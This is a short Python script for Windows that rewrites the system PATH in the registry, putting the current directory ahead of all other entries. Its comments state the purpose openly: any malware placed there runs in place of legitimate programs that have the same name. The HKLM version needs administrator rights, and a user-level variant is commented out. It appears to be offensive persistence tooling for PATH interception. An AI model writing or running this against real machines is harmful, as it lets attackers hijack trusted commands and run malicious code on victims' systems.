import os
import winreg


def readPathValue(reghive, regpath):
    reg = winreg.ConnectRegistry(None, reghive)
    key = winreg.OpenKey(reg, regpath, access=winreg.KEY_READ)
    index = 0
    while True:
        val = winreg.EnumValue(key, index)
        if val[0] == "Path":
            return val[1]
        index += 1


def editPathValue(reghive, regpath, targetdir):
    path = readPathValue(reghive, regpath)
    # Update path so our path appears before other values
    # Any malware in our path will be executed before legitimate programs if it has the same name as them
    newpath = targetdir + ";" + path
    # Update registry to contain new path
    reg = winreg.ConnectRegistry(None, reghive)
    key = winreg.OpenKey(reg, regpath, access=winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPAND_SZ, newpath)


# Modify user path - no extra permissions required
# reghive = winreg.HKEY_CURRENT_USER
# regpath = "Environment"
targetdir = os.getcwd()

# editPathValue(reghive,regpath,targetdir)

# Modify SYSTEM path - requires script to be run as admin
reghive = winreg.HKEY_LOCAL_MACHINE
regpath = "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
editPathValue(reghive, regpath, targetdir)

# Setting change applies after a reboot
